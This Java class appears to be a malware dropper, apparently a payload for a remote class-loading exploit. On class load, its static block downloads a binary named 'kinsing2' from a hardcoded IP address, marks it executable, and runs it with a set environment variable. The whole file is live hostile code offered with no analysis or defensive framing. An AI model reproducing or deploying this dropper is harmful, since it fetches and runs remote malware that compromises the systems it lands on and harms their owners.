import java.io.FileOutputStream;
import java.io.BufferedInputStream;
import java.net.URL;
import java.io.File;
import java.util.Random;

public class LifExp
{
    static {
        try {
            final Random random = new Random();
            random.setSeed(System.currentTimeMillis());
            final String string = "kinsing" + random.nextInt();
            final File file = new File(string);
            final BufferedInputStream bufferedInputStream = new BufferedInputStream(new URL("http://45.153.231.180/kinsing2").openStream());
            try {
                final FileOutputStream fileOutputStream = new FileOutputStream(file);
                final byte[] array = new byte[1024];
                int read;
                while ((read = bufferedInputStream.read(array, 0, 1024)) != -1) {
                    fileOutputStream.write(array, 0, read);
                }
                fileOutputStream.close();
            }
            catch (Exception ex2) {}
            bufferedInputStream.close();
            System.out.println(file.getAbsolutePath());
            Runtime.getRuntime().exec("chmod +x " + string).waitFor();
            final ProcessBuilder processBuilder = new ProcessBuilder(new String[] { "./" + string });
            processBuilder.inheritIO();
            processBuilder.environment().put("SKL", "lf");
            processBuilder.start();
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}